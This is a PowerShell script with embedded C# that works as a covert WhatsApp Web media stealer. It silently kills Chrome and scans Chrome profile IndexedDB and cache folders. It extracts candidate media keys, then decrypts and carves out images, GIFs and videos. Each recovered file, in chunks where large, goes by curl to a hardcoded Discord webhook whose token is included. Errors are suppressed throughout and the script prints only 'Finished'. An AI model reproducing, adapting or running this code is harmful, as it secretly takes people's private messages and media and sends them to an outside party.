param(
    [string]$OutSuffix = (Get-Date -Format "yyyyMMdd_HHmmss")
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$WEBHOOK = "https://discord.com/api/webhooks/1570512670191259728/JC1qDGSQ9UUmawR2hBU1Xnv106QXu0e_lcHHg89bYw1CZ5jnZ7gSEDJ_1d33cbclAs4M"

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $ScriptDir) { $ScriptDir = (Get-Location).Path }

# -- 1. Kill Chrome (silent) --
foreach ($n in @("chrome","chromedriver")) {
    $p = Get-Process -Name $n -ErrorAction SilentlyContinue
    if ($p) { $p | ForEach-Object { try { $_.Kill() } catch {} } }
}
Start-Sleep -Seconds 5
if (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
}

# -- 2. Find Chrome profiles --
$chromeRoots = @()
$baseRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (Test-Path $baseRoot) {
    Get-ChildItem $baseRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.Name -match '^(Default|Profile \d+|Guest Profile)$') { $chromeRoots += $_.FullName }
    }
}
if ($chromeRoots.Count -eq 0) { Write-Host "Finished"; exit 1 }

# -- 3. Build search list --
$searchPaths = @()
$waDbDirs = @()
$waBlobDirs = @()
foreach ($root in $chromeRoots) {
    $db = Join-Path $root "IndexedDB\https_web.whatsapp.com_0.indexeddb.leveldb"
    if (Test-Path $db) { $waDbDirs += $db; $searchPaths += $db }
    $blob = Join-Path $root "IndexedDB\https_web.whatsapp.com_0.indexeddb.blob"
    if (Test-Path $blob) { $waBlobDirs += $blob; $searchPaths += $blob }
    $sw1 = Join-Path $root "Service Worker\CacheStorage"
    $sw2 = Join-Path $root "Service Worker\ScriptCache"
    if (Test-Path $sw1) { $searchPaths += $sw1 }
    if (Test-Path $sw2) { $searchPaths += $sw2 }
}
$searchPaths = $searchPaths | Select-Object -Unique

# -- 4. Output folders --
$OutDir = Join-Path $ScriptDir ("recovered_wa_media_" + $OutSuffix)
$dirImages = Join-Path $OutDir "images"
$dirVideos = Join-Path $OutDir "videos"
$dirGifs   = Join-Path $OutDir "gifs"
foreach ($d in @($dirImages,$dirVideos,$dirGifs)) { New-Item -ItemType Directory -Force -Path $d | Out-Null }

# ============================================================
Add-Type -TypeDefinition @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;

public class WaHelper {
    public static List<byte[]> ExtractKeys(string path) {
        var result = new List<byte[]>();
        var data = File.ReadAllBytes(path);
        for (int i = 0; i <= data.Length - 32; i += 4) {
            bool[] seen = new bool[256];
            int uniq = 0;
            for (int j = 0; j < 32; j++) {
                if (!seen[data[i+j]]) { seen[data[i+j]] = true; uniq++; }
            }
            if (uniq >= 30) {
                byte[] k = new byte[32];
                Array.Copy(data, i, k, 0, 32);
                result.Add(k);
            }
        }
        return result;
    }

    public static int ScanFileForMedia(string path, string dirImages, string dirVideos, string dirGifs, bool tryDecrypt, List<byte[]> keys, bool isBlobFile) {
        int saved = 0;
        byte[] b;
        try { b = File.ReadAllBytes(path); } catch { return 0; }
        if (b.Length < 12) return 0;

        if (isBlobFile && keys.Count > 0) {
            foreach (byte[] key in keys) {
                byte[] dec = DecryptMedia(b, key);
                if (dec != null && dec.Length > 12) {
                    string ext = null, cat = null;
                    if (dec[0] == 0xFF && dec[1] == 0xD8) { ext = "jpg"; cat = "images"; }
                    else if (dec[0] == 0x89 && dec[1] == 0x50) { ext = "png"; cat = "images"; }
                    else if (dec[0] == 0x47 && dec[1] == 0x49) { ext = "gif"; cat = "gifs"; }
                    else if (dec.Length > 12 && dec[4] == 0x66 && dec[5] == 0x74) {
                        string brand = System.Text.Encoding.ASCII.GetString(dec, 8, 4);
                        if (!(brand.StartsWith("M4A") || brand.StartsWith("M4B"))) {
                            ext = brand.StartsWith("3gp") ? "3gp" : (brand.StartsWith("qt") ? "mov" : "mp4");
                            cat = "videos";
                        }
                    }
                    if (ext != null) {
                        string dir = cat == "images" ? dirImages : (cat == "videos" ? dirVideos : dirGifs);
                        string fn = "blobdec_" + Guid.NewGuid().ToString("N").Substring(0,8) + "." + ext;
                        File.WriteAllBytes(Path.Combine(dir, fn), dec);
                        return 1;
                    }
                }
            }
        }

        int pos = 0;
        while (pos < b.Length - 12) {
            if (b[pos] == 0xFF && b[pos+1] == 0xD8 && b[pos+2] == 0xFF) {
                int end = -1;
                int limit = Math.Min(b.Length - 1, pos + 5000000);
                for (int j = pos + 3; j < limit; j++) {
                    if (b[j] == 0xFF && b[j+1] == 0xD9) { end = j + 1; break; }
                }
                if (end > pos + 100) {
                    byte[] slice = new byte[end - pos + 1];
                    Array.Copy(b, pos, slice, 0, slice.Length);
                    string fn = "img_" + Guid.NewGuid().ToString("N").Substring(0,8) + ".jpg";
                    File.WriteAllBytes(Path.Combine(dirImages, fn), slice);
                    saved++;
                    pos = end + 1;
                    continue;
                }
            }
            if (b[pos] == 0x89 && b[pos+1] == 0x50 && b[pos+2] == 0x4E && b[pos+3] == 0x47) {
                int len = Math.Min(3000000, b.Length - pos);
                byte[] slice = new byte[len];
                Array.Copy(b, pos, slice, 0, len);
                string fn = "img_" + Guid.NewGuid().ToString("N").Substring(0,8) + ".png";
                File.WriteAllBytes(Path.Combine(dirImages, fn), slice);
                saved++;
                pos += len;
                continue;
            }
            if (b[pos] == 0x47 && b[pos+1] == 0x49 && b[pos+2] == 0x46 && b[pos+3] == 0x38) {
                int len = Math.Min(3000000, b.Length - pos);
                byte[] slice = new byte[len];
                Array.Copy(b, pos, slice, 0, len);
                string fn = "gif_" + Guid.NewGuid().ToString("N").Substring(0,8) + ".gif";
                File.WriteAllBytes(Path.Combine(dirGifs, fn), slice);
                saved++;
                pos += len;
                continue;
            }
            if (pos + 12 <= b.Length && b[pos+4] == 0x66 && b[pos+5] == 0x74 && b[pos+6] == 0x79 && b[pos+7] == 0x70) {
                string brand = System.Text.Encoding.ASCII.GetString(b, pos + 8, 4);
                if (brand.StartsWith("M4A") || brand.StartsWith("M4B")) { pos++; continue; }
                string ext = brand.StartsWith("3gp") ? "3gp" : (brand.StartsWith("qt") ? "mov" : "mp4");
                int len = Math.Min(50000000, b.Length - pos);
                byte[] slice = new byte[len];
                Array.Copy(b, pos, slice, 0, len);
                string fn = "vid_" + Guid.NewGuid().ToString("N").Substring(0,8) + "." + ext;
                File.WriteAllBytes(Path.Combine(dirVideos, fn), slice);
                saved++;
                pos += len;
                continue;
            }
            pos++;
        }

        if (tryDecrypt && saved == 0 && keys.Count > 0 && b.Length > 500) {
            int[] chunkSizes = new int[] { 65536, 131072, 262144 };
            foreach (int sz in chunkSizes) {
                if (sz >= b.Length) continue;
                int maxOffsets = Math.Min(3, b.Length / sz);
                for (int oi = 0; oi < maxOffsets; oi++) {
                    int off = oi * sz;
                    if (off + sz > b.Length) break;
                    byte[] chunk = new byte[sz];
                    Array.Copy(b, off, chunk, 0, sz);
                    foreach (byte[] key in keys) {
                        byte[] dec = DecryptMedia(chunk, key);
                        if (dec != null && dec.Length > 12) {
                            string ext = null, cat = null;
                            if (dec[0] == 0xFF && dec[1] == 0xD8) { ext = "jpg"; cat = "images"; }
                            else if (dec[0] == 0x89 && dec[1] == 0x50) { ext = "png"; cat = "images"; }
                            else if (dec[0] == 0x47 && dec[1] == 0x49) { ext = "gif"; cat = "gifs"; }
                            else if (dec.Length > 12 && dec[4] == 0x66 && dec[5] == 0x74) { ext = "mp4"; cat = "videos"; }
                            if (ext != null) {
                                string dir = cat == "images" ? dirImages : (cat == "videos" ? dirVideos : dirGifs);
                                string fn = "dec_" + Guid.NewGuid().ToString("N").Substring(0,8) + "." + ext;
                                File.WriteAllBytes(Path.Combine(dir, fn), dec);
                                saved++;
                                break;
                            }
                        }
                    }
                }
            }
        }
        return saved;
    }

    public static byte[] DecryptMedia(byte[] enc, byte[] key) {
        if (enc.Length < 42 || key.Length != 32) return null;
        try {
            byte[] salt = new byte[32];
            using (var hmac = new HMACSHA256(salt))
            {
                byte[] prk = hmac.ComputeHash(key);
                byte[] info = System.Text.Encoding.UTF8.GetBytes("WhatsApp Media Keys");
                byte[] expanded = HKDFExpand(prk, info, 112);
                byte[] iv = new byte[16]; Array.Copy(expanded, 0, iv, 0, 16);
                byte[] ck = new byte[32]; Array.Copy(expanded, 16, ck, 0, 32);
                byte[] mk = new byte[32]; Array.Copy(expanded, 48, mk, 0, 32);
                int clen = enc.Length - 10;
                byte[] ct = new byte[clen]; Array.Copy(enc, 0, ct, 0, clen);
                byte[] mac = new byte[10]; Array.Copy(enc, clen, mac, 0, 10);
                using (var hmac2 = new HMACSHA256(mk))
                {
                    byte[] toMac = new byte[iv.Length + ct.Length];
                    Array.Copy(iv, 0, toMac, 0, iv.Length);
                    Array.Copy(ct, 0, toMac, iv.Length, ct.Length);
                    byte[] calc = hmac2.ComputeHash(toMac);
                    for (int i = 0; i < 10; i++) if (mac[i] != calc[i]) return null;
                }
                using (var aes = Aes.Create())
                {
                    aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                    aes.Key = ck; aes.IV = iv;
                    using (var dec = aes.CreateDecryptor())
                    {
                        return dec.TransformFinalBlock(ct, 0, ct.Length);
                    }
                }
            }
        } catch { return null; }
    }

    static byte[] HKDFExpand(byte[] prk, byte[] info, int len) {
        var okm = new List<byte>();
        byte[] t = new byte[0];
        int i = 1;
        using (var hmac = new HMACSHA256(prk))
        {
            while (okm.Count < len)
            {
                byte[] buf = new byte[t.Length + info.Length + 1];
                Array.Copy(t, 0, buf, 0, t.Length);
                Array.Copy(info, 0, buf, t.Length, info.Length);
                buf[buf.Length - 1] = (byte)i;
                t = hmac.ComputeHash(buf);
                okm.AddRange(t);
                i++;
            }
        }
        byte[] result = new byte[len];
        okm.CopyTo(0, result, 0, len);
        return result;
    }
}
"@

# -- 5. Extract keys (silent) --
$keys = @(); $seen = @{}
foreach ($dbDir in $waDbDirs) {
    $logFiles = @(Get-ChildItem $dbDir -Filter "*.log" -File -ErrorAction SilentlyContinue)
    foreach ($f in $logFiles) {
        try {
            $found = [WaHelper]::ExtractKeys($f.FullName)
            foreach ($k in $found) {
                $h = [BitConverter]::ToString($k)
                if (-not $seen.ContainsKey($h)) { $seen[$h]=$true; $keys += ,$k }
            }
        } catch {}
    }
}

# -- 6. Scan locations (silent) --
foreach ($sp in $searchPaths) {
    $files = @(Get-ChildItem $sp -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -gt 100 -and $_.Length -lt 20MB })
    if ($files.Count -eq 0) { continue }

    $isDbDir   = $waDbDirs   -contains $sp
    $isBlobDir = $waBlobDirs -contains $sp
    foreach ($f in $files) {
        try {
            $null = [WaHelper]::ScanFileForMedia($f.FullName, $dirImages, $dirVideos, $dirGifs, ($isDbDir -or $isBlobDir), [System.Collections.Generic.List[byte[]]]$keys, $isBlobDir)
        } catch {}
    }
}

# -- 7. Cleanup empty dirs --
foreach ($d in @($dirImages,$dirVideos,$dirGifs)) {
    if ((Get-ChildItem $d -File -ErrorAction SilentlyContinue).Count -eq 0) {
        Remove-Item $d -Force -ErrorAction SilentlyContinue
    }
}

# -- 8. Send each file individually to Discord (silent) --
$all = @(Get-ChildItem $OutDir -Recurse -File -ErrorAction SilentlyContinue)

foreach ($file in $all) {
    $sizeMB = $file.Length / 1MB
    if ($sizeMB -le 8) {
        $curlArgs = @("-s", "-X", "POST", $WEBHOOK)
        $curlArgs += @("-F", "files[0]=@$($file.FullName)")
        & curl.exe @curlArgs | Out-Null
    } else {
        $bytes = [IO.File]::ReadAllBytes($file.FullName)
        $chunkBytes = 7MB
        $parts = [Math]::Ceiling($bytes.Length / $chunkBytes)
        for ($p = 0; $p -lt $parts; $p++) {
            $s = $p * $chunkBytes
            $e = [Math]::Min($s + $chunkBytes, $bytes.Length) - 1
            $partPath = "$($file.FullName).part$p"
            [IO.File]::WriteAllBytes($partPath, $bytes[$s..$e])
            $partArgs = @("-s", "-X", "POST", $WEBHOOK)
            $partArgs += @("-F", "files[0]=@$partPath")
            & curl.exe @partArgs | Out-Null
            Remove-Item $partPath -Force -ErrorAction SilentlyContinue
        }
    }
    Start-Sleep -Milliseconds 300
}

Write-Host "Finished"
